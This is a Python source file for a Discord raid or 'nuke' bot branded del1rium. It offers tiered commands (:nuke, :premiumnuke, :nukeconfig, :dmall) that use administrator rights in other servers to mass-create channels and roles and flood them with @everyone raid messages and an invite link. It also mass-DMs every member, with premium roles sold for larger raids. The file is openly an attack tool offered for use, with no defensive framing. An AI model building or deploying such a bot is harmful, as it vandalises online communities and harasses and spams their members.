import discord
from discord.ext import commands
import asyncio
import os
import gc
from dotenv import load_dotenv
import engine
import worker

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ CONFIGURATION ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

CENTRAL_SERVER_ID = 1453920087194206394
PREMIUM_ROLE_ID = 1458177413325259035
OWNER_ID = 1450919094202269881
LOG_CHANNEL_ID = 1458257075393003561

# New Security Roles
AUTHORIZED_ROLE_ID = 1455874072411111600
# Note: You can add a specific Booster Role ID here if needed, 
# but usually checking for 'premium_subscriber' status is better.
# For now, we'll check if they have the AUTHORIZED_ROLE_ID.

DEFAULT_NAME = "premium-raid"
DEFAULT_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2 https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"
RAID_ICON = "https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"
PUBLIC_DM_TEXT = "https://discord.gg/cJJJWHfnn2"
PUBLIC_ROLE_NAME = "raid by del1rium co."

user_configs = {}

def get_config(user_id):
    return user_configs.get(user_id, {"name": DEFAULT_NAME, "text": DEFAULT_TEXT})

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ SECURITY CHECKS ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def is_authorized(user_id):
    """Checks if the user has the mandatory authorized role."""
    if user_id == OWNER_ID: return True
    central = bot.get_guild(CENTRAL_SERVER_ID)
    if not central: return False
    member = central.get_member(user_id)
    if not member: return False
    
    # Check for the specific authorized role
    has_auth_role = any(r.id == AUTHORIZED_ROLE_ID for r in member.roles)
    return has_auth_role

def is_premium(user_id):
    """Checks if the user has the premium role."""
    if user_id == OWNER_ID: return True
    central = bot.get_guild(CENTRAL_SERVER_ID)
    if not central: return False
    member = central.get_member(user_id)
    if not member: return False
    
    # Check for premium role
    return any(r.id == PREMIUM_ROLE_ID for r in member.roles)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ INITIALIZATION ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents, help_command=None)

@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    DEL1RIUM - ONLINE / EN LINEA
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    User / Usuario: {bot.user.name}
    Status / Estado: Ready / Listo
    Security: Role-Based Authorization Active
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ COMMANDS ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.command(name='help')
async def help_cmd(ctx):
    if ctx.channel.id == LOG_CHANNEL_ID: return
    await ctx.message.delete()
    
    embed = discord.Embed(title="OPERATIONAL INTERFACE / INTERFAZ OPERATIVA", color=0x2b2d31)
    
    public_desc = (
        "**`:nuke`**\nStandard deployment (25 channels + 10 roles).\n*Requires Authorized Role.*\n\n"
        "**`:dmall`**\nSend fixed invitation to all members.\n*Requires Authorized Role.*"
    )
    embed.add_field(name="PUBLIC MODULE / MODULO PUBLICO", value=public_desc, inline=False)
    
    premium_desc = (
        "**`:premiumnuke`**\nMassive deployment (50 channels + 20 roles).\n*Requires Premium Role.*\n\n"
        "**`:nukeconfig <name>, <text>`**\nConfigure personal payload.\n*Requires Premium Role.*\n\n"
        "**`:dmall <text>`**\nSend custom message to all members.\n*Requires Premium Role.*"
    )
    embed.add_field(name="PREMIUM MODULE / MODULO PREMIUM", value=premium_desc, inline=False)
    
    embed.set_footer(text="Del1rium Co. | Security Level: High")
    await ctx.send(embed=embed, delete_after=60)

@bot.command(name='nuke')
async def nuke_cmd(ctx):
    if not is_authorized(ctx.author.id):
        embed = discord.Embed(title="ACCESS DENIED / ACCESO DENEGADO", description="Authorized role required.\nSe requiere el rol autorizado.", color=0x2b2d31)
        return await ctx.send(embed=embed, delete_after=10)

    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not ctx.guild.me.guild_permissions.administrator: return
    await engine.start_nuke(ctx, bot, "raid-by-del1rium", "@everyone raid by [𝔡𝔢𝔩1𝔯𝔦𝔲𝔪 ℭ𝔬.](https://discord.gg/cJJJWHfnn2)", 25, 500, 10, PUBLIC_ROLE_NAME, False, LOG_CHANNEL_ID, RAID_ICON)

@bot.command(name='premiumnuke')
async def premium_nuke_cmd(ctx):
    if not is_premium(ctx.author.id):
        embed = discord.Embed(title="RESTRICTED / RESTRINGIDO", description="Premium required.\nSuscripcion requerida.", color=0x2b2d31)
        return await ctx.send(embed=embed, delete_after=10)
    
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not ctx.guild.me.guild_permissions.administrator: return
    config = get_config(ctx.author.id)
    await engine.start_nuke(ctx, bot, config["name"], config["text"], 50, 1000, 20, config["name"], True, LOG_CHANNEL_ID, RAID_ICON)

@bot.command(name='nukeconfig')
async def config_cmd(ctx, *, args: str = None):
    if not is_premium(ctx.author.id):
        embed = discord.Embed(title="RESTRICTED / RESTRINGIDO", description="Premium required.\nSuscripcion requerida.", color=0x2b2d31)
        return await ctx.send(embed=embed, delete_after=10)

    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not args or "," not in args:
        embed = discord.Embed(title="ERROR", description="Usage: :nukeconfig name, text", color=0x2b2d31)
        return await ctx.send(embed=embed, delete_after=10)
    
    name, text = [x.strip() for x in args.split(",", 1)]
    user_configs[ctx.author.id] = {"name": name, "text": text}
    try: await ctx.message.delete()
    except: pass
    
    embed = discord.Embed(title="UPDATED / ACTUALIZADO", color=0x2b2d31)
    embed.add_field(name="Payload", value=f"Name: `{name}`\nText: ```{text}```", inline=False)
    await ctx.send(embed=embed, delete_after=15)
    gc.collect()

@bot.command(name='dmall')
async def dmall_cmd(ctx, *, message: str = None):
    if not is_authorized(ctx.author.id):
        embed = discord.Embed(title="ACCESS DENIED / ACCESO DENEGADO", description="Authorized role required.\nSe requiere el rol autorizado.", color=0x2b2d31)
        return await ctx.send(embed=embed, delete_after=10)

    if ctx.guild.id == CENTRAL_SERVER_ID: return
    await ctx.message.delete()
    
    is_user_premium = is_premium(ctx.author.id)
    final_message = message if (is_user_premium and message) else PUBLIC_DM_TEXT
    
    count = await worker.mass_dm_worker(ctx.guild, final_message, is_user_premium)
    
    embed = discord.Embed(title="DM ALL", description=f"Messages sent / Mensajes enviados: {count}", color=0x2b2d31)
    if not is_user_premium:
        embed.set_footer(text="Public version: Fixed invitation sent.")
    await ctx.send(embed=embed, delete_after=15)
    gc.collect()

if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("ERROR: TOKEN NOT FOUND")
